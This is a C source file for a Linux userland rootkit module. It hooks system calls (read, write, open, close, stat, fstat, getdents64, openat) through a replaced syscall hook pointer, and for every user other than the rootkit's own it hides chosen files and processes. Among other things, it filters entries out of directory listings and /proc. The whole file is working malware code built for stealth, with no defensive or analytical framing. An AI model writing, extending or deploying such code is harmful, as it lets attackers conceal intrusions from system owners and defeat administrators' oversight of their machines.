#define _GNU_SOURCE
#define _LARGEFILE_SOURCE 1
#include <stdio.h> 
#include <errno.h> 
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>
#include <dlfcn.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>

#define DEBUG
#define BUF_SIZE 1024
#include "utils/clean.c"
#include "utils/xor.c"
#include "utils/fd2fname.c"
#include "utils/is_hidden.c"
#include "utils/is_rk_user.c"
#include "utils/pid2pname.c"
#include "rkconsts.h"


typedef long (*syscall_fn_t)(long, long, long, long, long, long, long);

static syscall_fn_t next_sys_call = NULL;

struct linux_dirent64 {
    ino64_t        d_ino;    /* 64-bit inode number */
    off64_t        d_off;    /* 64-bit offset to next structure */
    unsigned short d_reclen; /* Size of this dirent */
    unsigned char  d_type;   /* File type */
    char           d_name[]; /* Filename (null-terminated) */
};

static long hook_function(long a1, long a2, long a3,
			  long a4, long a5, long a6,
			  long a7)
{
    // DEBUG_MSG("rax_stack=%ld rdi=%ld rsi=%ld rdx=%ld r10_stack=%ld r8=%ld r9=%ld\n", a1, a2, a3, a4, a5, a6, a7);
    switch(a1) {
        case 0: {
            // ssize_t read(int fd, void *buf, size_t count);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] read hooked!\n")
            char path[256];
            int fd = (int)a2;
            fd_to_fname(fd, path, sizeof(path));
            if (check_if_hidden_path(path)) {
                DEBUG_MSG("[!] Hiding file %s from read\n", path);
                return -1;
            }
            break;
        }
        case 1: {
            // ssize_t write(int fd, const void *buf, size_
            if (is_rk_user()) break;
            DEBUG_MSG("[-] write hooked!\n");
            char path[256];
            int fd = (int)a2;
            fd_to_fname(fd, path, sizeof(path));
            if (check_if_hidden_path(path)) {
                DEBUG_MSG("[!] Hiding file %s from wrute\n", path);
                return -1;
            }
            break;
        }
        case 2: {
            // int open(const char *pathname, int flags);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] open hooked!\n");
            const char *path = (const char *)a2;
            if (check_if_hidden_path(path)) {
                DEBUG_MSG("[!] Hiding file %s from open\n", path);
                return -ENOENT;
            }
            break;
        }
        case 3: {
            // int close(int fd);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] close hooked!\n");
            int fd;
            char path[256];
            fd = (int)a2;
            fd_to_fname(fd, path, sizeof(path));
            if (check_if_hidden_path(path)) {
                DEBUG_MSG("[!] Hiding file %s from close\n", path);
                return -1;
            }
            break;
        }
        case 4: {
            // int stat(const char *path, struct stat *buf);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] stat hooked!\n");
            const char *path = (const char *)a2;
            if (check_if_hidden_path(path)) {
                DEBUG_MSG("[!] Hiding file %s from stat\n", path);
                return -ENOENT;
            }
            break;
        }
        case 5: {
            // int fstat(int fd, struct stat *statbuf);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] fstat hooked!\n");
            int fd;
            char path[256];
            fd = (int)a2;
            fd_to_fname(fd, path, sizeof(path));             
            if (check_if_hidden_path(path)) {
                DEBUG_MSG("[!] Hiding file %s from fstat\n", path);
                return -1;
            }
            break;  
        }
        case 217: {
            // int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] getdents64 hooked!\n");
            char tmpbuf[BUF_SIZE];
            int nread;
            int fd = (int)a2;
            struct linux_dirent64 *dirp = (struct linux_dirent64 *)a3;
            int valid_len = 0;

            // Check if we are in /proc or not
            char fname[256];
            fd_to_fname(fd, fname, sizeof(fname));
            int in_proc = 0;
            if (strcmp(fname, "/proc") == 0) {
                in_proc = 1;
                DEBUG_MSG("[?] Inside /proc!\n")
            }
            while (1) {
                nread = syscall(SYS_getdents64, fd, tmpbuf, BUF_SIZE); 
                if (nread == -1) {
                    // Handle error
                }
                if (nread == 0) {
                    break; // No more entries
                }

                for (int bpos = 0, valid_pos = 0; bpos < nread;) {
                    struct linux_dirent64 *d, *valid_d; 
                    d = (struct linux_dirent64 *)(tmpbuf + bpos);
                    // DEBUG_MSG("%s\n", d->d_name);
                    if (in_proc == 1) {
                        char proc_name[256];
                        pid_to_pname(d->d_name, proc_name);
                        if (check_if_hidden_path(proc_name)) {
                            DEBUG_MSG("[!] Hiding process %s from getdents64\n", proc_name);
                            bpos += d->d_reclen;
                            continue;
                        }
                    }
                    else {
                        if (check_if_hidden_path(d->d_name)) {
                            DEBUG_MSG("[!] Hiding file %s from getdents64\n", d->d_name);
                            bpos += d->d_reclen;
                            continue; // Skip entry
                        }
                    }
                    // Calculate the length of the valid entries
                    valid_len += d->d_reclen;

                    // If hiding files, we need to move valid entries up in the buffer
                    if (bpos != valid_pos) {
                        valid_d = (struct linux_dirent64 *)(tmpbuf + valid_pos);
                        memcpy(valid_d, d, d->d_reclen);
                    }

                    valid_pos += d->d_reclen;
                    bpos += d->d_reclen;
                }
            }
            memcpy(dirp, tmpbuf, valid_len);
            return valid_len;
        }
        case 257: {
            //  int openat(int fd, const char *path, int oflag, ...);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] openat hooked!\n");
            char *path = (char *)a3;
            if (check_if_hidden_path(path)) {
                DEBUG_MSG("[!] Hiding file %s\n", path);
                return -ENOENT;
            }
            break;
        }
        default: 
            //DEBUG_MSG("output from hook_function: syscall number %ld\n", a1);
            ;
    }
    // DEBUG_MSG("Returning next_sys_call\n");    
	return next_sys_call(a1, a2, a3, a4, a5, a6, a7);
}

int __hook_init(long placeholder __attribute__((unused)),
		void *sys_call_hook_ptr)
{
	DEBUG_MSG("[-] __hook_init loaded \n");
	next_sys_call = *((syscall_fn_t *) sys_call_hook_ptr);
	*((syscall_fn_t *) sys_call_hook_ptr) = hook_function;

	return 0;
}
